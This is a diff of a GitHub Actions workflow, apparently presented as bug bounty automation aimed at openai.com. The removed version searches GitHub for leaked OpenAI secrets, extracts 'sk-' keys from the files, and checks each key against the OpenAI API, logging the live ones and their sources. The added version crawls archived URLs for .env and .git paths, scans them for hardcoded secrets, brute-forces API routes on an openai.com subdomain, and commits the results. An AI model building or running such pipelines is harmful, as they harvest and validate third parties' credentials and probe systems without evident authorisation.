@@ -1,4 +1,4 @@
-name: Ultimate-oombikal
+name: Apex-oombikal
 on:
   workflow_dispatch:
 
@@ -6,105 +6,102 @@ permissions:
   contents: write
 
 jobs:
-  # 1. GITHUB DORKING: Finding the 6,100+ leaks
-  github-dorks:
+  # 1. PREPARATION: Download and Reassemble Data
+  prep-data:
     runs-on: ubuntu-latest
+    outputs:
+      history_ready: ${{ steps.check.outputs.exists }}
     steps:
       - name: Checkout
         uses: actions/checkout@v4
-      - name: Run GitHub Dorks
-        env:
-          GITHUB_TOKEN: ${{ secrets.GH_DORKER_TOKEN }}
+      - name: Download history.txt from Google Drive
         run: |
-          mkdir -p dork_findings
-          # Searching for OpenAI patterns
-          curl -H "Authorization: token $GITHUB_TOKEN" "https://api.github.com/search/code?q=openai.com+password&per_page=100" >> dork_findings/leaks.json || true
-          curl -H "Authorization: token $GITHUB_TOKEN" "https://api.github.com/search/code?q=openai.com+secret_key&per_page=100" >> dork_findings/leaks.json || true
-      - name: Upload Dork Data
+          # Uses the direct download format for Google Drive
+          curl -L "https://docs.google.com/uc?export=download&id=1vD2GpVHiMlR1wmoQfxcZfIpKeCRuadZx" -o history.txt
+      - name: Upload for Jobs
         uses: actions/upload-artifact@v4
         with:
-          name: dork-results
-          path: dork_findings/leaks.json
+          name: history-file
+          path: history.txt
 
-  # 2. AUTOMATED VERIFICATION: Testing the findings
-  verify-leaks:
-    needs: github-dorks
+  # 2. DEEP HISTORY & SECRET SCANNING
+  deep-scan:
+    needs: prep-data
     runs-on: ubuntu-latest
     steps:
       - name: Checkout
         uses: actions/checkout@v4
-      - name: Download Results
+      - name: Download History
         uses: actions/download-artifact@v4
         with:
-          name: dork-results
-      - name: Verify OpenAI Keys
+          name: history-file
+      - name: Setup Gauplus & SecretFinder
         run: |
-          echo "=== VERIFIED LIVE KEYS ===" > verified_keys.txt
-          # Convert GitHub URLs to Raw URLs and scan for sk- keys
-          jq -r '.items[].html_url' leaks.json | sed 's/github.com/raw.githubusercontent.com/; s/\/blob\//\//' > targets.txt
+          go install github.com/bp0lr/gauplus@latest
+          pip install secretfinder
+          sudo mv ~/go/bin/gauplus /usr/local/bin/
+      - name: Analyze & Fuzz
+        run: |
+          mkdir -p findings
+          # Merge existing history with fresh data
+          echo "openai.com" | gauplus -t 20 > fresh.txt
+          cat history.txt fresh.txt | sort -u > master.txt
           
-          while read url; do
-            # Find the key pattern sk- followed by alphanumeric characters
-            key=$(curl -s "$url" | grep -oE "sk-[a-zA-Z0-9]{32,}" | head -n 1)
-            if [ ! -z "$key" ]; then
-              # Test the key against OpenAI API
-              status=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $key" https://api.openai.com/v1/models)
-              if [ "$status" == "200" ]; then
-                echo "[CRITICAL] LIVE KEY FOUND: $key" >> verified_keys.txt
-                echo "Source: $url" >> verified_keys.txt
-                echo "---" >> verified_keys.txt
-              fi
-            fi
-          done < targets.txt
-      - name: Upload Verified
+          # Grep for critical patterns (.env, .php, API keys)
+          echo "--- SENSITIVE ENDPOINTS ---" > findings/critical.txt
+          grep -iE "\.env|\.git|\.config|\.sql|\.json" master.txt | head -n 100 >> findings/critical.txt || true
+          
+          # Scan top 50 historical URLs for hardcoded secrets
+          head -n 50 master.txt | xargs -I % python3 -m SecretFinder -i % -o cli >> findings/secrets.txt || true
+      - name: Upload findings
         uses: actions/upload-artifact@v4
         with:
-          name: verified-data
-          path: verified_keys.txt
+          name: deep-findings
+          path: findings/
 
-  # 3. WAYBACK & TAKEOVERS (Independent Jobs)
-  extra-scans:
+  # 3. API DISCOVERY (Kiterunner)
+  api-recon:
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout
-        uses: actions/checkout@v4
-      - name: Subjack & GAU
+      - name: Install Kiterunner
         run: |
-          go install github.com/haccer/subjack@latest
-          go install github.com/lc/gau/v2/cmd/gau@latest
-          echo "openai.com" | ~/go/bin/gau > history.txt
-          ~/go/bin/subjack -w recon/subs.txt -t 100 -ssl -o takeover.txt || true
-      - name: Upload Extras
+          wget https://github.com/assetnote/kiterunner/releases/download/v1.0.2/kiterunner_1.0.2_linux_amd64.tar.gz
+          tar -xvf kiterunner_1.0.2_linux_amd64.tar.gz
+          sudo mv kr /usr/local/bin/
+      - name: Scan API Routes
+        run: |
+          kr scan https://discord.verify.openai.com -w https://raw.githubusercontent.com/assetnote/wordlists/master/data/automated/httparchive/apiroutes-2020-11-20.txt > kr_api.txt || true
+      - name: Upload KR
         uses: actions/upload-artifact@v4
         with:
-          name: extra-data
-          path: |
-            history.txt
-            takeover.txt
+          name: kr-results
+          path: kr_api.txt
 
-  # 4. FINAL REPORTING
+  # 4. FINAL REPORTING & COMMIT
   reporting:
-    needs: [verify-leaks, extra-scans]
+    needs: [deep-scan, api-recon]
     if: always()
     runs-on: ubuntu-latest
     steps:
       - name: Checkout
         uses: actions/checkout@v4
-      - name: Download All
+      - name: Download All Results
         uses: actions/download-artifact@v4
         continue-on-error: true
-      - name: Build Final Report
+      - name: Generate Final Report
         run: |
-          echo "=== BUG BOUNTY SUMMARY REPORT ===" > final_full_report.txt
-          echo "--- ACTIVE OPENAI KEYS ---" >> final_full_report.txt
-          cat verified-data/verified_keys.txt >> final_full_report.txt || echo "None found yet." >> final_full_report.txt
-          echo "--- SUBDOMAIN TAKEOVERS ---" >> final_full_report.txt
-          cat extra-data/takeover.txt >> final_full_report.txt || echo "None." >> final_full_report.txt
+          echo "=== APEX BUG BOUNTY REPORT ===" > final_full_report.txt
+          echo "--- CRITICAL HISTORY FINDINGS ---" >> final_full_report.txt
+          cat deep-findings/critical.txt >> final_full_report.txt || echo "None" >> final_full_report.txt
+          echo "--- JS SECRETS ---" >> final_full_report.txt
+          cat deep-findings/secrets.txt >> final_full_report.txt || echo "None" >> final_full_report.txt
+          echo "--- HIDDEN API ROUTES ---" >> final_full_report.txt
+          cat kr-results/kr_api.txt | head -n 50 >> final_full_report.txt || echo "None" >> final_full_report.txt
       - name: Push to Repo
         run: |
           git config --local user.email "action@github.com"
           git config --local user.name "Security-Bot"
           git add final_full_report.txt
-          git commit -m "Results Updated: Found $(grep -c 'LIVE KEY' final_full_report.txt || echo 0) live keys" || exit 0
+          git commit -m "Nuclear Recon Finished - Data from Drive Analyzed" || exit 0
           git push
           
